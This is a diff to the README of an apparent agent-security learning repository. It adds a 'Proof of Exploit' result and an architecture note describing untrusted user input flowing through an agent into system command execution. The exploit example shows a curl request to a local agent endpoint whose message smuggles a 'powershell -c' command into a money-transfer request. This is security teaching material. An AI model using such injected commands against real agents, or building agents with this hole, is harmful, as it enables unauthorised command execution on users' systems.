@@ -1,4 +1,16 @@
 # 🔐 AI Security Labs — Offensive Learning Repository
+```md
+## 💣 Proof of Exploit
+{
+  "result": "hacked"
+}
+---
+
+## 🧱 Architecture
+
+User → Agent → Tool → System Command
+
+Vulnerability: Untrusted input passed directly into execution layer
 
 This repository documents my hands-on learning in **AI + Agent Security**, focusing on real-world vulnerability patterns such as:
 
@@ -34,7 +46,7 @@ A vulnerable AI-agent-like system blindly passes user-controlled input into a sy
 
 ### Exploit Example
 
-```bash
+`bash
 curl -X POST http://127.0.0.1:3000/agent \
 -H "Content-Type: application/json" \
 -d '{"message": "transfer $1000 to powershell -c echo hacked"}'
